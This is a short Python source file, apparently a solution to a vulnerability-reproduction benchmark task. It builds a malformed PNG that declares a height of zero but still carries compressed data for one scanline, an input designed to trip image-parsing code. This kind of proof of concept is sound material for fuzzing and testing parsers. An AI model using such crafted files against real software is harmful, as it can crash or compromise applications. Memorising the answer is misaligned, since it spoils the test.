import struct
import zlib
import binascii

class Solution:
    def solve(self, src_path: str) -> bytes:
        return self._make_png_zero_height()

    def _png_chunk(self, chunk_type: bytes, data: bytes) -> bytes:
        length = struct.pack(">I", len(data))
        crc = struct.pack(">I", binascii.crc32(chunk_type + data) & 0xffffffff)
        return length + chunk_type + data + crc

    def _make_png_zero_height(self) -> bytes:
        # Create a PNG with width=1 and height=0 but with IDAT data for one scanline
        signature = b"\x89PNG\r\n\x1a\n"

        width = 1
        height = 0
        bit_depth = 8
        color_type = 2  # Truecolor (RGB)
        compression = 0
        filter_method = 0
        interlace = 0

        ihdr_data = struct.pack(">IIBBBBB", width, height, bit_depth, color_type, compression, filter_method, interlace)
        ihdr_chunk = self._png_chunk(b'IHDR', ihdr_data)

        # One scanline for width=1, color_type=2: filter byte + 3 bytes RGB = 4 bytes total
        raw_scanline = b'\x00' + b'\x00\x00\x00'
        compressed = zlib.compress(raw_scanline, level=9)
        idat_chunk = self._png_chunk(b'IDAT', compressed)

        iend_chunk = self._png_chunk(b'IEND', b'')

        return signature + ihdr_chunk + idat_chunk + iend_chunk